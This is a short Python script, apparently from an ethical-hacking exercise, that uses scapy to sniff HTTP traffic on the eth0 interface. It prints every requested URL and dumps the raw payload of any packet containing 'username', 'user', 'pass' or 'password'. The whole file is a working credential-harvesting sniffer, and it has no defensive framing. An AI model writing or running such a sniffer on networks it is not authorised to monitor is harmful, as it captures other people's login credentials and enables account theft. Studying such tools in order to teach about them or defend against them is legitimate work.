
#! /usr/bin/env/python3

import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url= packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords= ["username", "user", "pass", "password"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break # if the raw data contains more than one keyword, show it once only


sniff("eth0")